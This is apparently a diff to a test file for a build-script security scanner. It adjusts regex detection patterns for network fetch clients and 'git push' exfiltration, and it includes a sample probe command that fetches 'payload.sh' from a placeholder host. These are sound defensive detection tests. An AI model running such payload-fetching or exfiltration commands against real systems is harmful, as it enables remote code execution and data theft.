@@ -45,7 +45,6 @@ import pytest
 from trustsight.analysis.buildfetch import _REGISTRY_RESOLVE
 from trustsight.config import (
     _SUBCOMMAND_OPTS,
-    EXEC_WRAPPER,
     NETWORK_CLIENT_ALTERNATIVES,
     PACKAGE_MANAGER_INSTALL,
 )
@@ -303,6 +302,11 @@ CORE_ONLY_DELIBERATE: dict[str, str] = {
     r"fetch(?=\s+[^\n;&|]*\b(?:https?|ftps?)://)": (
         "recall-limit: BSD `fetch(1)`; the validator covers the fetch-class clients it aliases"
     ),
+    r"fetch(?!\()": (
+        "recall-limit: BSD `fetch(1)` unanchored (core's second, bare arm); the "
+        "bare word collides with `git fetch` and ordinary build helpers, so the "
+        "validator matches only the fetch-class clients it aliases"
+    ),
     r"git(?:\s+(?:-C\s*\S+|-c\s*\S+|--\S+))*\s+push": (
         "X-exfil direction: `git push` sends bytes *out*. The validator certifies "
         "fetch-in chains only, so an outbound push is not one of its primitives."
@@ -313,8 +317,7 @@ CORE_ONLY_DELIBERATE: dict[str, str] = {
 # Command boundaries and wrappers need a real command, not _example's
 # minimal rendering of lookarounds and alternations.
 CORE_PROBES = {
-    r"(?:\A|[;&|()`{}])\s*(?:" + EXEC_WRAPPER + r")*"
-    r"(?:/[^\s;&|]+/)?fetch(?!\()": "fetch https://example.invalid/payload.sh",
+    r"fetch(?!\()": "fetch https://example.invalid/payload.sh",
 }
 
 
